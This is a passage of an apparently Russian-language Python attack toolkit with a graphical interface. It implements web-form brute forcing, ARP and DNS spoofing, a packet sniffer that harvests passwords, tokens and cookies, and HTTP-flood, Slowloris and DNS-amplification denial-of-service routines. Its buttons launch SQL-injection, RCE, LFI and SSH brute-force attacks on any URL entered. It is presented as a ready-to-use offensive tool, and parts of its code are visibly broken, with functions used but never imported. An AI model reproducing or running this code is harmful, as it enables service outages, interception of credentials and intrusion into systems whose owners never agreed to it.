        session.verify = False
        
        results.append(f"[*] Брутфорс формы: {url}")
        
        for username in self.wordlists['usernames']:
            for password in self.wordlists['passwords'][:15]:
                try:
                    if method.upper() == 'POST':
                        data = {username_field: username, password_field: password}
                        response = session.post(url, data=data, timeout=5)
                    else:
                        params = {username_field: username, password_field: password}
                        response = session.get(url, params=params, timeout=5)
                    
                    # Проверка успешного входа
                    if success_indicator:
                        if success_indicator in response.text:
                            results.append(f"[+] УСПЕХ: {username}:{password}")
                            return results
                    else:
                        # Автодетекция
                        fail_indicators = ['invalid', 'incorrect', 'wrong', 'error', 'failed']
                        if not any(indicator in response.text.lower() for indicator in fail_indicators):
                            results.append(f"[+] ВОЗМОЖНЫЙ УСПЕХ: {username}:{password}")
                            results.append(f"[+] Ответ: {response.text[:100]}")
                            return results
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    results.append(f"[-] Ошибка: {str(e)}")
                    break
        
        results.append("[-] Валидные учетные данные не найдены")
        return results
    
    def stop(self):
        """Остановка брутфорса"""
        self.running = False

# ==================== MITM ATTACK CLASS ====================

class MITMAttacker:
    def __init__(self):
        self.running = False
        self.captured_data = []
        self.interface = None
    
    def arp_spoof(self, target_ip, gateway_ip, interface='eth0'):
        """ARP spoofing атака"""
        try:
            from scapy.all import ARP, Ether, sendp
            
            self.running = True
            self.captured_data = []
            
            def get_mac(ip):
                arp_request = ARP(pdst=ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast/arp_request
                answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
                return answered_list[0][1].hwsrc
            
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            
            # Отравление ARP таблиц
            while self.running:
                try:
                    # Отправляем жертве, что мы - роутер
                    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                    sendp(packet, verbose=False)
                    
                    # Отправляем роутеру, что мы - жертва
                    packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                    sendp(packet, verbose=False)
                    
                    time.sleep(2)
                    
                except Exception as e:
                    self.captured_data.append(f"Ошибка ARP spoof: {str(e)}")
                    break
            
            return True
            
        except ImportError:
            return False
        except Exception as e:
            self.captured_data.append(f"Ошибка инициализации: {str(e)}")
            return False
    
    def packet_sniffer(self, filter_exp="tcp port 80 or tcp port 443", count=100):
        """Прослушивание пакетов"""
        try:
            from scapy.all import sniff
            
            def packet_callback(packet):
                if packet.haslayer('Raw'):
                    load = packet['Raw'].load
                    if load:
                        load_str = load.decode('utf-8', errors='ignore')
                        
                        # Поиск интересных данных
                        interesting = ['password', 'pass', 'pwd', 'login', 'user', 
                                      'username', 'email', 'token', 'session', 'cookie']
                        
                        if any(keyword in load_str.lower() for keyword in interesting):
                            self.captured_data.append(f"Пакет: {load_str[:200]}")
                            
                            # Сохранение в файл
                            with open('captured_data.txt', 'a') as f:
                                f.write(f"{time.time()}: {load_str[:500]}\n")
            
            sniff(filter=filter_exp, prn=packet_callback, count=count, store=0)
            return True
            
        except Exception as e:
            self.captured_data.append(f"Ошибка сниффера: {str(e)}")
            return False
    
    def dns_spoof(self, target_domain, spoof_ip):
        """DNS спуфинг"""
        try:
            from scapy.all import DNS, DNSQR, DNSRR
            
            self.running = True
            
            def dns_callback(packet):
                if packet.haslayer(DNSQR):
                    domain = packet[DNSQR].qname.decode()
                    if target_domain in domain:
                        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                     UDP(dport=packet[UDP].sport, sport=53) / \
                                     DNS(id=packet[DNS].id, 
                                         qr=1, 
                                         aa=1, 
                                         qd=packet[DNS].qd,
                                         an=DNSRR(rrname=packet[DNSQR].qname, 
                                                 ttl=10, 
                                                 rdata=spoof_ip))
                        send(spoofed_pkt, verbose=0)
                        self.captured_data.append(f"DNS спуфинг: {domain} -> {spoof_ip}")
            
            sniff(filter="udp port 53", prn=dns_callback, store=0)
            return True
            
        except Exception as e:
            self.captured_data.append(f"Ошибка DNS spoof: {str(e)}")
            return False
    
    def stop(self):
        """Остановка MITM атаки"""
        self.running = False

# ==================== ADVANCED DDOS CLASS ====================

class AdvancedDDoSAttacker:
    def __init__(self):
        self.running = False
        self.threads = []
        self.request_count = 0
        
        # Расширенный список User-Agent
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ]
        
        # Список рефереров
        self.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://www.amazon.com/',
            'https://www.reddit.com/',
            'https://twitter.com/',
            'https://www.linkedin.com/',
            'https://www.instagram.com/',
            'https://www.baidu.com/',
            'https://www.yahoo.com/'
        ]
    
    def advanced_http_flood(self, target, duration=60, threads=200, method='GET', use_proxy=False):
        """Продвинутый HTTP flood с обходом защиты"""
        print(f"[*] Запуск продвинутого HTTP flood на {target}")
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.running = True
        self.request_count = 0
        start_time = time.time()
        end_time = start_time + duration
        
        parsed = urlparse(target)
        host = parsed.netloc
        base_path = parsed.path if parsed.path else '/'
        
        # Прокси для обхода блокировок
        proxies = None
        if use_proxy:
            # Используем публичные прокси
            proxy_list = [
                'http://proxy1.com:8080',
                'http://proxy2.com:8080',
                'http://proxy3.com:8080'
            ]
        
        def flood_worker(worker_id):
            session = requests.Session()
            session.verify = False
            session.timeout = 5
            
            while time.time() < end_time and self.running:
                try:
                    # Генерация случайных параметров
                    random_params = {
                        'cache': secrets.token_hex(8),
                        'timestamp': int(time.time() * 1000),
                        'session': secrets.token_hex(16),
                        'ref': random.randint(100000, 999999)
                    }
                    
                    # Случайный путь
                    random_paths = [
                        base_path,
                        base_path + 'index.html',
                        base_path + 'home',
                        base_path + 'page' + str(random.randint(1, 100)),
                        base_path + 'api/v1/test',
                        base_path + 'wp-content/themes/default/style.css',
                        base_path + 'static/js/main.js'
                    ]
                    
                    path = random.choice(random_paths)
                    
                    # Случайные заголовки
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': random.choice(['en-US,en;q=0.5', 'ru-RU,ru;q=0.8', 'de-DE,de;q=0.9']),
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': random.choice(['keep-alive', 'close']),
                        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                        'Referer': random.choice(self.referers),
                        'Host': host,
                        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                        'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                    }
                    
                    # Случайные куки
                    cookies = {
                        'session_id': secrets.token_hex(16),
                        'user_token': secrets.token_hex(8),
                        'tracking_id': str(random.randint(1000000, 9999999))
                    }
                    
                    # Случайные данные для POST
                    post_data = {
                        'username': secrets.token_hex(8),
                        'email': f'{secrets.token_hex(6)}@example.com',
                        'password': secrets.token_hex(12),
                        'csrf_token': secrets.token_hex(16),
                        'action': random.choice(['login', 'register', 'search', 'submit'])
                    }
                    
                    # Выбор метода
                    if method == 'GET':
                        # GET с параметрами
                        if random.random() > 0.5:
                            response = session.get(
                                target + path,
                                params=random_params,
                                headers=headers,
                                cookies=cookies,
                                timeout=3
                            )
                        else:
                            response = session.get(
                                target,
                                headers=headers,
                                cookies=cookies,
                                timeout=3
                            )
                    
                    elif method == 'POST':
                        # POST с данными
                        response = session.post(
                            target,
                            data=post_data,
                            headers=headers,
                            cookies=cookies,
                            timeout=3
                        )
                    
                    elif method == 'MIXED':
                        # Смешанные методы
                        if random.random() > 0.7:
                            response = session.post(
                                target,
                                data=post_data,
                                headers=headers,
                                cookies=cookies,
                                timeout=3
                            )
                        else:
                            response = session.get(
                                target + path,
                                params=random_params,
                                headers=headers,
                                cookies=cookies,
                                timeout=3
                            )
                    
                    self.request_count += 1
                    
                    # Логирование каждые 100 запросов
                    if self.request_count % 100 == 0:
                        elapsed = time.time() - start_time
                        rate = self.request_count / elapsed if elapsed > 0 else 0
                        print(f"[+] Отправлено {self.request_count} запросов ({rate:.1f}/сек)")
                    
                    # Случайная задержка
                    time.sleep(random.uniform(0.01, 0.1))
                    
                except Exception as e:
                    # Тихая обработка ошибок
                    continue
        
        # Запуск потоков
        self.threads = []
        for i in range(threads):
            t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.05)  # Стаггеринг запуска
        
        # Ожидание завершения
        for t in self.threads:
            t.join(timeout=duration + 5)
        
        return True
    
    def slowloris_advanced(self, target, sockets=500, duration=120):
        """Продвинутый Slowloris с большим количеством соединений"""
        print(f"[*] Запуск продвинутого Slowloris на {target}")
        
        parsed = urlparse(target if '://' in target else f'http://{target}')
        host = parsed.netloc.split(':')[0]
        port = 443 if parsed.scheme == 'https' else 80
        
        self.running = True
        start_time = time.time()
        end_time = start_time + duration
        
        connections = []
        
        def create_connection():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((host, port))
                
                # Отправляем неполный HTTP запрос
                request = f"GET /?{random.randint(1, 10000)} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += f"Referer: {random.choice(self.referers)}\r\n"
                request += "Connection: keep-alive\r\n"
                request += f"X-Request-ID: {secrets.token_hex(8)}\r\n"
                
                sock.send(request.encode())
                return sock
            except:
                return None
        
        # Создание соединений
        print(f"[*] Создание {sockets} соединений...")
        for i in range(sockets):
            if not self.running:
                break
            sock = create_connection()
            if sock:
                connections.append(sock)
            time.sleep(0.02)
        
        print(f"[+] Создано {len(connections)} соединений")
        
        # Поддержание соединений
        last_stats = time.time()
        while time.time() < end_time and self.running:
            for sock in connections[:]:
                try:
                    # Отправляем случайные заголовки для поддержания соединения
                    header_name = f"X-{random.choice(['Custom', 'Random', 'Test', 'Debug'])}-{random.randint(1000, 9999)}"
                    header_value = secrets.token_hex(random.randint(4, 12))
                    sock.send(f"{header_name}: {header_value}\r\n".encode())
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    connections.remove(sock)
                    
                    # Пытаемся создать новое соединение
                    if self.running:
                        new_sock = create_connection()
                        if new_sock:
                            connections.append(new_sock)
            
            # Случайная задержка
            time.sleep(random.uniform(10, 25))
            
            # Статистика каждые 15 секунд
            if time.time() - last_stats > 15:
                print(f"[*] Активных соединений: {len(connections)}")
                last_stats = time.time()
        
        # Закрытие соединений
        print(f"[*] Закрытие {len(connections)} соединений...")
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        return True
    
    def udp_amplification(self, target, duration=30, amplification_factor=10):
        """UDP amplification атака"""
        print(f"[*] Запуск UDP amplification на {target}")
        
        try:
            parsed = urlparse(target if '://' in target else f"//{target}")
            host = parsed.netloc.split(':')[0]
            
            # DNS amplification
            dns_servers = [
                '8.8.8.8',  # Google DNS
                '1.1.1.1',  # Cloudflare
                '9.9.9.9',  # Quad9
                '208.67.222.222'  # OpenDNS
            ]
            
            self.running = True
            start_time = time.time()
            end_time = start_time + duration
            
            # DNS запрос для amplification
            dns_query = bytearray()
            dns_query.extend([0x12, 0x34])  # Transaction ID
            dns_query.extend([0x01, 0x00])  # Flags
            dns_query.extend([0x00, 0x01])  # Questions
            dns_query.extend([0x00, 0x00])  # Answer RRs
            dns_query.extend([0x00, 0x00])  # Authority RRs
            dns_query.extend([0x00, 0x00])  # Additional RRs
            
            # Добавляем домен
            domain_parts = host.split('.')
            for part in domain_parts:
                dns_query.append(len(part))
                dns_query.extend(part.encode())
            dns_query.append(0x00)  # Конец домена
            
            dns_query.extend([0x00, 0x01])  # Type A
            dns_query.extend([0x00, 0x01])  # Class IN
            
            def amplification_worker():
                while time.time() < end_time and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1)
                        
                        # Отправляем на DNS сервер с поддельным IP источника
                        for dns_server in dns_servers:
                            sock.sendto(dns_query, (dns_server, 53))
                            self.request_count += 1
                        
                        sock.close()
                        
                    except:
                        continue
            
            # Запускаем потоки
            self.threads = []
            for i in range(amplification_factor * 5):  # Увеличиваем количество потоков
                t = threading.Thread(target=amplification_worker, daemon=True)
                t.start()
                self.threads.append(t)
            
            # Ожидание
            for t in self.threads:
                t.join(timeout=duration + 5)
            
            return True
            
        except Exception as e:
            print(f"Ошибка UDP amplification: {e}")
            return False
    
    def mixed_attack(self, target, duration=90):
        """Смешанная атака - комбинация методов"""
        print(f"[*] Запуск смешанной атаки на {target}")
        
        self.running = True
        start_time = time.time()
        
        # Запускаем разные типы атак в разных потоках
        def run_http_flood():
            self.advanced_http_flood(target, duration, threads=100, method='MIXED')
        
        def run_slowloris():
            self.slowloris_advanced(target, sockets=300, duration=duration)
        
        def run_udp():
            self.udp_amplification(target, duration=min(duration, 30))
        
        # Запускаем все атаки
        threads = []
        threads.append(threading.Thread(target=run_http_flood, daemon=True))
        threads.append(threading.Thread(target=run_slowloris, daemon=True))
        threads.append(threading.Thread(target=run_udp, daemon=True))
        
        for t in threads:
            t.start()
        
        self.threads = threads
        
        # Ожидаем завершения
        for t in threads:
            t.join(timeout=duration + 10)
        
        return True
    
    def stop(self):
        """Остановка всех атак"""
        self.running = False
        
        # Ждем завершения потоков
        for t in self.threads:
            try:
                t.join(timeout=2)
            except:
                pass
        
        self.threads = []
        print(f"[*] Атака остановлена. Всего запросов: {self.request_count}")

# ==================== ИНИЦИАЛИЗАЦИЯ ====================

analyzer = AdvancedSiteAnalyzer()
exploiter = AdvancedExploiter()
bruteforcer = AdvancedBruteforcer()
mitm = MITMAttacker()
ddos = AdvancedDDoSAttacker()

# ==================== GUI ФУНКЦИИ ====================

def log_msg(message, level="info"):
    """Логирование сообщений"""
    colors = {
        "info": COLORS["accent_cyan"],
        "success": COLORS["accent_green"],
        "warning": COLORS["accent_yellow"],
        "error": COLORS["accent_red"],
        "attack": COLORS["accent_red"],
        "exploit": COLORS["accent_purple"],
        "critical": COLORS["critical"]
    }
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    color = colors.get(level, COLORS["text_primary"])
    
    icons = {
        "info": "[i]",
        "success": "[+]",
        "warning": "[!]",
        "error": "[x]",
        "attack": "[ATTACK]",
        "exploit": "[EXPLOIT]",
        "critical": "[CRITICAL]"
    }
    
    icon = icons.get(level, "[*]")
    dpg.add_text(f"{icon} [{timestamp}] {message}", parent="log_content", color=color)
    dpg.set_y_scroll("log_scroll", -1.0)

def deep_analyze_site():
    """Глубокий анализ сайта"""
    url = dpg.get_value("url_input")
    
    if not url or len(url) < 5:
        log_msg("Введите корректный URL", "error")
        return
    
    log_msg(f"Начинаем глубокий анализ: {url}", "info")
    dpg.set_value("progress", 0.1)
    
    def analysis_thread():
        try:
            results = analyzer.deep_analyze(url)
            
            # Сохраняем результаты
            global ANALYSIS_RESULTS
            ANALYSIS_RESULTS = results
            
            # Показываем результаты
            dpg.split_frame()
            show_detailed_results(results)
            
            # Сохраняем в историю
            HISTORY.append({
                'url': url,
                'time': datetime.now().strftime("%H:%M:%S %d.%m.%Y"),
                'ip': results.get('ip_info', {}).get('primary_ip', 'N/A'),
                'ports': len(results.get('ports_services', {})),
                'vulns': len(results.get('vulnerabilities', [])),
                'critical': len(results.get('critical_issues', [])),
                'subdomains': len(results.get('subdomains', []))
            })
            
            # Обновляем историю
            update_history_display()
            
            # Обновляем вкладку эксплойтов
            update_exploitation_tab(results)
            
            log_msg(f"Глубокий анализ завершен: {results['domain']}", "success")
            log_msg(f"Найдено {len(results['vulnerabilities'])} уязвимостей, {len(results['critical_issues'])} критических", 
                   "critical" if results['critical_issues'] else "success")
            dpg.set_value("progress", 1.0)
            
        except Exception as e:
            log_msg(f"Ошибка анализа: {str(e)}", "error")
            dpg.set_value("progress", 0.0)
    
    threading.Thread(target=analysis_thread, daemon=True).start()

def show_detailed_results(results):
    """Показ детальных результатов анализа"""
    for child in dpg.get_item_children("results_area", slot=1):
        dpg.delete_item(child)
    
    with dpg.group(parent="results_area"):
        dpg.add_text("=" * 70, color=COLORS["accent_cyan"])
        dpg.add_text("РЕЗУЛЬТАТЫ ГЛУБОКОГО АНАЛИЗА", color=COLORS["accent_green"])
        dpg.add_text("=" * 70, color=COLORS["accent_cyan"])
        dpg.add_spacer(height=10)
        
        # Сводка
        with dpg.collapsing_header(label="📊 СВОДКА АНАЛИЗА", default_open=True):
            with dpg.table(header_row=True, borders_innerH=True, borders_outerH=True, 
                          borders_innerV=True, borders_outerV=True):
                dpg.add_table_column(label="Параметр")
                dpg.add_table_column(label="Значение")
                dpg.add_table_column(label="Статус")
                
                with dpg.table_row():
                    dpg.add_text("URL")
                    dpg.add_text(results['url'][:50] + "..." if len(results['url']) > 50 else results['url'])
                    dpg.add_text("✓", color=COLORS["success"])
                
                with dpg.table_row():
                    dpg.add_text("Домен")
                    dpg.add_text(results['domain'])
                    dpg.add_text("✓", color=COLORS["success"])
                
                with dpg.table_row():
                    dpg.add_text("Основной IP")
                    ip = results.get('ip_info', {}).get('primary_ip', 'N/A')
                    dpg.add_text(ip)
                    dpg.add_text("✓", color=COLORS["success"])
                
                with dpg.table_row():
                    dpg.add_text("Открытые порты")
                    ports_count = len(results.get('ports_services', {}))
                    dpg.add_text(str(ports_count))
                    color = COLORS["warning"] if ports_count > 10 else COLORS["success"]
                    dpg.add_text(str(ports_count), color=color)
                
                with dpg.table_row():
                    dpg.add_text("Всего уязвимостей")
                    vulns_count = len(results.get('vulnerabilities', []))
                    dpg.add_text(str(vulns_count))
                    color = COLORS["error"] if vulns_count > 0 else COLORS["success"]
                    dpg.add_text(str(vulns_count), color=color)
                
                with dpg.table_row():
                    dpg.add_text("Критических уязвимостей")
                    critical_count = len(results.get('critical_issues', []))
                    dpg.add_text(str(critical_count))
                    color = COLORS["critical"] if critical_count > 0 else COLORS["success"]
                    dpg.add_text(str(critical_count), color=color)
                
                with dpg.table_row():
                    dpg.add_text("Поддомены")
                    subs_count = len(results.get('subdomains', []))
                    dpg.add_text(str(subs_count))
                    dpg.add_text(str(subs_count), color=COLORS["accent_cyan"])
        
        # Критические уязвимости
        if results.get('critical_issues'):
            with dpg.collapsing_header(label="🔴 КРИТИЧЕСКИЕ УЯЗВИМОСТИ", default_open=True):
                for issue in results['critical_issues']:
                    with dpg.group(horizontal=True):
                        dpg.add_text("•", color=COLORS["critical"])
                        dpg.add_text(f"{issue.get('type', 'Unknown')}: {issue.get('evidence', '')[:100]}", 
                                   color=COLORS["critical"])
        
        # Технологический стек
        if results.get('tech_stack'):
            with dpg.collapsing_header(label="🛠 ТЕХНОЛОГИЧЕСКИЙ СТЕК"):
                tech = results['tech_stack']
                for key, value in tech.items():
                    if value and value != 'Не определен':
                        dpg.add_text(f"{key}: {value}", color=COLORS["text_primary"])
        
        # Анализ безопасности
        if results.get('security_analysis'):
            with dpg.collapsing_header(label="🛡 АНАЛИЗ БЕЗОПАСНОСТИ"):
                sec = results['security_analysis']
                
                # Заголовки
                if sec.get('headers'):
                    dpg.add_text("Заголовки безопасности:", color=COLORS["accent_yellow"])
                    for header, info in sec['headers'].items():
                        if info.get('present'):
                            color = COLORS["success"] if info.get('secure') else COLORS["warning"]
                            dpg.add_text(f"  {header}: {info.get('value', '')[:50]}", color=color)
                
                # Проблемы конфигурации
                if sec.get('misconfigurations'):
                    dpg.add_text("\nПроблемы конфигурации:", color=COLORS["accent_red"])
                    for issue in sec['misconfigurations']:
                        dpg.add_text(f"  • {issue}", color=COLORS["text_secondary"])
        
        # Открытые порты
        if results.get('ports_services'):
            with dpg.collapsing_header(label="🔌 ОТКРЫТЫЕ ПОРТЫ И СЕРВИСЫ"):
                ports = results['ports_services']
                for port, info in sorted(ports.items()):
                    service = info.get('service', 'Unknown')
                    banner = info.get('banner', '')
                    
                    with dpg.group(horizontal=True):
                        dpg.add_text(f"Порт {port}: {service}", color=COLORS["accent_green"])
                        if banner:
                            dpg.add_text(f" ({banner[:30]}...)", color=COLORS["text_secondary"])
        
        # Поддомены
        if results.get('subdomains'):
            with dpg.collapsing_header(label="🌐 ПОДДОМЕНЫ"):
                for sub in results['subdomains'][:20]:  # Ограничим вывод
                    dpg.add_text(f"• {sub}", color=COLORS["accent_cyan"])
        
        # Найденные файлы и директории
        if results.get('directory_enum'):
            with dpg.collapsing_header(label="📁 ФАЙЛЫ И ДИРЕКТОРИИ"):
                for item in results['directory_enum'][:15]:
                    status_color = COLORS["success"] if item.get('status') == 200 else COLORS["warning"]
                    dpg.add_text(f"• {item.get('url', '')} [{item.get('status')}]", color=status_color)

def update_history_display():
    """Обновление истории"""
    for child in dpg.get_item_children("history_content", slot=1):
        dpg.delete_item(child)
    
    with dpg.group(parent="history_content"):
        if HISTORY:
            for idx, item in enumerate(reversed(HISTORY[-15:]), 1):
                with dpg.group():
                    dpg.add_text(f"{idx}. {item['time']}", color=COLORS["text_primary"])
                    dpg.add_text(f"   URL: {item['url'][:40]}...", color=COLORS["text_secondary"])
                    
                    with dpg.group(horizontal=True):
                        dpg.add_text(f"IP: {item['ip']} | ", color=COLORS["accent_cyan"])
                        dpg.add_text(f"Порты: {item['ports']} | ", color=COLORS["accent_yellow"])
                        dpg.add_text(f"Уязвимости: {item['vulns']} | ", color=COLORS["accent_red"])
                        dpg.add_text(f"Критич.: {item['critical']} | ", color=COLORS["critical"])
                        dpg.add_text(f"Поддомены: {item['subdomains']}", color=COLORS["accent_green"])
                    
                    dpg.add_spacer(height=5)
        else:
            dpg.add_text("История пуста", color=COLORS["text_secondary"])

def update_exploitation_tab(results):
    """Обновление вкладки эксплойтов на основе результатов анализа"""
    for child in dpg.get_item_children("exploit_main_area", slot=1):
        dpg.delete_item(child)
    
    with dpg.group(parent="exploit_main_area"):
        vulns = results.get('vulnerabilities', [])
        critical = results.get('critical_issues', [])
        tech = results.get('tech_stack', {})
        ports = results.get('ports_services', {})
        
        dpg.add_text("ДОСТУПНЫЕ ЭКСПЛОЙТЫ НА ОСНОВЕ АНАЛИЗА", color=COLORS["accent_purple"])
        dpg.add_spacer(height=10)
        
        # Критические уязвимости
        if critical:
            dpg.add_text("🔴 КРИТИЧЕСКИЕ ЭКСПЛОЙТЫ:", color=COLORS["critical"])
            dpg.add_spacer(height=5)
            
            for issue in critical[:5]:
                issue_type = issue.get('type', '')
                param = issue.get('param', '')
                payload = issue.get('payload', '')
                
                if 'SQL Injection' in issue_type:
                    with dpg.group():
                        dpg.add_text("• SQL Injection Exploit:", color=COLORS["text_primary"])
                        dpg.add_text(f"  Параметр: {param}", color=COLORS["text_secondary"])
                        dpg.add_text(f"  Payload: {payload[:30]}...", color=COLORS["text_secondary"])
                        
                        with dpg.group(horizontal=True):
                            dpg.add_button(
                                label="Union Exploit",
                                width=120,
                                height=25,
                                callback=lambda s=dpg, t=results['url'], p=param: 
                                    run_specific_exploit('sqli', 'union_based', target=t, param=p)
                            )
                            dpg.add_button(
                                label="Blind Exploit",
                                width=120,
                                height=25,
                                callback=lambda s=dpg, t=results['url'], p=param: 
                                    run_specific_exploit('sqli', 'blind_time', target=t, param=p)
                            )
                
                elif 'Command Injection' in issue_type:
                    dpg.add_text("• Command Injection Exploit:", color=COLORS["text_primary"])
                    dpg.add_button(
                        label="Запустить RCE",
                        width=150,
                        height=30,
                        callback=lambda s=dpg, t=results['url'], p=param: 
                            run_specific_exploit('rce', 'command_injection', target=t, param=p)
                    )
                
                elif 'File Inclusion' in issue_type:
                    dpg.add_text("• LFI to RCE Exploit:", color=COLORS["text_primary"])
                    dpg.add_button(
                        label="Запустить LFI->RCE",
                        width=150,
                        height=30,
                        callback=lambda s=dpg, t=results['url'], p=param: 
                            run_specific_exploit('lfi', 'rce_log', target=t, param=p)
                    )
        
        # CMS эксплойты
        if 'cms' in tech:
            cms = tech['cms']
            dpg.add_spacer(height=10)
            dpg.add_text(f"🛠 {cms.upper()} ЭКСПЛОЙТЫ:", color=COLORS["accent_orange"])
            dpg.add_spacer(height=5)
            
            if cms == 'WordPress':
                dpg.add_button(
                    label="WordPress XML-RPC DoS",
                    width=200,
                    height=30,
                    callback=lambda s=dpg, t=results['url']: 
                        run_specific_exploit('cms', 'wordpress', target=t)
                )
                dpg.add_button(
                    label="WordPress Login Bruteforce",
                    width=200,
                    height=30,
                    callback=lambda s=dpg, t=results['url']: 
                        run_specific_exploit('auth', 'login_bruteforce', target=t)
                )
            
            elif cms == 'Joomla':
                dpg.add_button(
                    label="Joomla Exploits",
                    width=200,
                    height=30,
                    callback=lambda s=dpg, t=results['url']: 
                        run_specific_exploit('cms', 'joomla', target=t)
                )
        
        # SSH брутфорс если открыт порт 22
        if 22 in ports:
            dpg.add_spacer(height=10)
            dpg.add_text("🔐 SSH BRUTEFORCE:", color=COLORS["accent_red"])
            dpg.add_spacer(height=5)
            
            target_ip = results.get('ip_info', {}).get('primary_ip', results['domain'])
            dpg.add_text(f"Цель: {target_ip}:22", color=COLORS["text_secondary"])
            
            dpg.add_button(
                label="Запустить SSH Bruteforce",
                width=200,
                height=30,
                callback=lambda s=dpg, t=target_ip: run_ssh_bruteforce_gui(t, 22)
            )
        
        # Общие эксплойты
        dpg.add_spacer(height=10)
        dpg.add_text("🛠 ОБЩИЕ ЭКСПЛОЙТЫ:", color=COLORS["accent_cyan"])
        dpg.add_spacer(height=5)
        
        with dpg.group(horizontal=True):
            dpg.add_button(
                label="XSS Exploit",
                width=150,
                height=30,
                callback=lambda: run_specific_exploit('xss', 'reflected', target=results['url'])
            )
            dpg.add_button(
                label="Login Bruteforce",
                width=150,
                height=30,
                callback=lambda: run_specific_exploit('auth', 'login_bruteforce', target=results['url'])
            )
        
        with dpg.group(horizontal=True):
            dpg.add_button(
                label="GraphQL Exploit",
                width=150,
                height=30,
                callback=lambda: run_specific_exploit('api', 'graphql_injection', target=results['url'])
            )
            dpg.add_button(
                label="Web Form Bruteforce",
                width=150,
                height=30,
                callback=lambda: run_web_form_bruteforce_gui(results['url'])
            )

def run_specific_exploit(exploit_type, exploit_name, **kwargs):
    """Запуск конкретного эксплойта"""
    global EXPLOIT_RUNNING
    
    if EXPLOIT_RUNNING:
        log_msg("Эксплойт уже выполняется", "warning")
        return
    
    target = kwargs.get('target', dpg.get_value("url_input"))
    if not target:
        log_msg("Сначала введите цель", "error")
        return
    
    log_msg(f"Запуск эксплойта: {exploit_name} на {target}", "exploit")
    
    def exploit_thread():
        global EXPLOIT_RUNNING
        EXPLOIT_RUNNING = True
        
        try:
            results = exploiter.execute_exploit(exploit_type, exploit_name, **kwargs)
            
            # Показываем результаты
            show_exploit_results(exploit_name, target, results)
            
            log_msg(f"Эксплойт {exploit_name} завершен", "success")
            
        except Exception as e:
            log_msg(f"Ошибка эксплойта: {str(e)}", "error")
        
        EXPLOIT_RUNNING = False
    
    threading.Thread(target=exploit_thread, daemon=True).start()

def show_exploit_results(exploit_name, target, results):
    """Показ результатов эксплойта"""
    with dpg.window(label=f"Результаты: {exploit_name}", width=800, height=600, modal=True):
        dpg.add_text(f"ЭКСПЛОЙТ: {exploit_name.upper()}", color=COLORS["accent_purple"])
        dpg.add_text(f"ЦЕЛЬ: {target}", color=COLORS["accent_cyan"])
        dpg.add_separator()
        
        with dpg.child_window(height=-1):
            for result in results:
                if '[+]' in result:
                    dpg.add_text(result, color=COLORS["success"])
                elif '[!]' in result:
                    dpg.add_text(result, color=COLORS["warning"])
                elif '[-]' in result:
                    dpg.add_text(result, color=COLORS["error"])
                elif '[*]' in result:
                    dpg.add_text(result, color=COLORS["accent_cyan"])
                else:
                    dpg.add_text(result, color=COLORS["text_primary"])

def run_ssh_bruteforce_gui(target, port):
    """SSH брутфорс через GUI"""
    if BRUTEFORCE_RUNNING:
        log_msg("Брутфорс уже выполняется", "warning")
        return
    
    log_msg(f"Запуск SSH брутфорса на {target}:{port}", "attack")
    
    def bruteforce_thread():
        global BRUTEFORCE_RUNNING
        BRUTEFORCE_RUNNING = True
        
        try:
            results = bruteforcer.ssh_bruteforce(target, port)
            
            with dpg.window(label="SSH Bruteforce Results", width=700, height=500, modal=True):
                dpg.add_text(f"SSH BRUTEFORCE: {target}:{port}", color=COLORS["accent_red"])
                dpg.add_separator()
                
                for result in results:
                    if '[+]' in result:
                        dpg.add_text(result, color=COLORS["success"])
                    else:
                        dpg.add_text(result, color=COLORS["text_primary"])
